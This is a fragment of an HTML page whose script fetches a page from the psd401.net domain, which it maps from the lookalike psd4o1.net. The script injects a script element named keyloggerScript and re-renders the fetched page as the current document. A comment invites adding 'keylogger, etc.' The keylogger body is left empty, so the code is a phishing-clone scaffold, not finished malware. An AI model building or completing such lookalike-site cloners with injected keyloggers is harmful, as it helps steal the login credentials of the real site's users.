  <script>
    //var url = window.location.href.replace(/psd4o1.net/i, "psd401.net").replace(/^[^https:\/\/]/i, "https://");
    var url = window.prompt("URL:");
    url = url.replace(/psd4o1.net/i, "psd401.net").replace(/^[^https:\/\/]/i, "https://");
    var httpRequest = new XMLHttpRequest();
    httpRequest.open("GET", url);
    httpRequest.withCredentials = false;
    httpRequest.responseType = "document";
    httpRequest.send();
    httpRequest.onreadystatechange = function() {
      var httpRequest = this;
      if (httpRequest.readyState === 4 && httpRequest.status === 200) {
        //change all relative filepaths in document ("/img.png", etc.) to literal filepaths on the Internet, by translating the relative filepaths to literal filepaths ("my.psd401.net/img.png", etc.).
        //also add in your various things, like keylogger, etc.
        var htmlDocumentDom = httpRequest.response;
        var keyloggerScript = htmlDocumentDom.createElement("script");
        keyloggerScript.textContent = "";
        htmlDocumentDom.documentElement.appendChild(keyloggerScript);
        var htmlDocumentFileText = new XMLSerializer().serializeToString(htmlDocumentDom);
        document.open();
        document.write(htmlDocumentFileText);
        document.close();
      };
    };
  </script>
</html>
